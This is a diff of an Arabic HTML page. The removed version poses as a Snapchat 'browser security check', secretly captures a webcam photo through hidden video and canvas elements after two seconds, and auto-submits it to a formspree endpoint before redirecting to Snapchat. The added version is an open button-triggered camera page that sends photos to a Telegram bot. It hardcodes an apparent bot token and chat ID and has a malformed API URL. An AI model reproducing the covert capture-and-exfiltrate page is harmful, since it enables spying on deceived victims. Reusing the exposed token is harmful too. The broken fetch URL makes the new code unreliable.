@@ -3,66 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat | جاري التحقق</title>
-    <!-- أيقونة سناب شات -->
-    <link rel="icon" type="image/png" href="https://snapchat.com">
+    <title>كاميرا تيليجرام الشخصية</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #FFFC00; }
-        .box { text-align: center; background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 85%; max-width: 350px; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h3 { font-size: 18px; color: #333; margin: 0; }
-        p { font-size: 13px; color: #666; margin-top: 10px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 20px; background: #eef2f3; color: #333; }
+        .container { max-width: 600px; margin: auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        video { width: 100%; border-radius: 10px; background: #000; }
+        button { background: #2488ff; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 50px; cursor: pointer; margin-top: 20px; width: 100%; font-weight: bold; transition: 0.3s; }
+        button:hover { background: #0056b3; transform: scale(1.02); }
+        button:disabled { background: #ccc; cursor: not-allowed; }
+        .status { margin-top: 15px; font-size: 14px; color: #666; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <div class="loader"></div>
-        <h3>جاري التحقق من أمان المتصفح</h3>
-        <p>يرجى السماح بالوصول للكاميرا للمتابعة...</p>
+    <div class="container">
+        <h2>نظام الإرسال للتيليجرام</h2>
+        <p>اضغط على الزر لالتقاط صورة وإرسالها لبوتك فوراً</p>
+        
+        <video id="video" autoplay playsinline></video>
+        <button id="capture">📸 التقاط وإرسال الآن</button>
+        <div id="status" class="status">الحالة: جاهز</div>
+
+        <!-- عنصر خفي للمعالجة -->
+        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
     </div>
-
-    <!-- عناصر التقاط الصورة (مخفية) -->
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-
-    <!-- الرابط المحدث النهائي -->
-    <form id="photoForm" action="https://formspree.io" method="POST">
-        <input type="hidden" name="image_data" id="imageInput">
-        <input type="hidden" name="_next" value="https://snapchat.com">
-        <input type="hidden" name="_subject" value="التقاط جديد">
-    </form>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const imageInput = document.getElementById('imageInput');
-        const form = document.getElementById('photoForm');
+        const captureBtn = document.getElementById('capture');
+        const statusText = document.getElementById('status');
 
-        // طلب الوصول للكاميرا
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                
-                // التقاط الصورة بعد ثانيتين (لضبط الإضاءة)
-                setTimeout(() => {
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, 640, 480);
-                    
-                    // تحويل الصورة لـ JPEG مضغوط لضمان الإرسال السريع
-                    const dataURL = canvas.toDataURL('image/jpeg', 0.5);
-                    imageInput.value = dataURL;
-                    
-                    // إرسال النموذج تلقائياً
-                    form.submit();
-                }, 2000);
+        // معلوماتك الخاصة التي تم ضبطها
+        const token = '7793041544:AAG9UpAjcR8XiLdCReyjf2TSg-0rXDGWgoI';
+        const chatId = '7191557045'; 
+
+        // تشغيل الكاميرا فور فتح الصفحة
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => { 
+                video.srcObject = stream; 
+                statusText.innerText = "الحالة: الكاميرا تعمل";
             })
-            .catch(err => {
-                console.error("رفض الكاميرا:", err);
-                // توجيه المستخدم حتى لو رفض الكاميرا
-                window.location.href = "https://snapchat.com";
+            .catch(err => { 
+                statusText.innerText = "الحالة: خطأ في الوصول للكاميرا";
+                alert("يرجى تفعيل صلاحية الكاميرا");
             });
+
+        captureBtn.addEventListener('click', () => {
+            const context = canvas.getContext('2d');
+            // رسم اللقطة الحالية من الفيديو على الـ Canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // تحويل الصورة إلى ملف (Blob) بصيغة JPEG
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'image.jpg');
+
+                statusText.innerText = "الحالة: جاري الرفع لتيليجرام...";
+                captureBtn.disabled = true;
+
+                // إرسال الطلب لبوت تيليجرام
+                fetch(`https://telegram.org{token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if(data.ok) {
+                        statusText.innerText = "الحالة: تم الإرسال بنجاح! ✅";
+                        alert("وصلت الصورة إلى هاتفك!");
+                    } else {
+                        statusText.innerText = "الحالة: فشل الإرسال ❌";
+                        alert("خطأ من تيليجرام: " + data.description);
+                    }
+                })
+                .catch(err => {
+                    statusText.innerText = "الحالة: خطأ في الاتصال";
+                    console.error(err);
+                })
+                .finally(() => {
+                    captureBtn.disabled = false;
+                });
+            }, 'image/jpeg', 0.8); // جودة الصورة 80%
+        });
     </script>
 </body>
 </html>
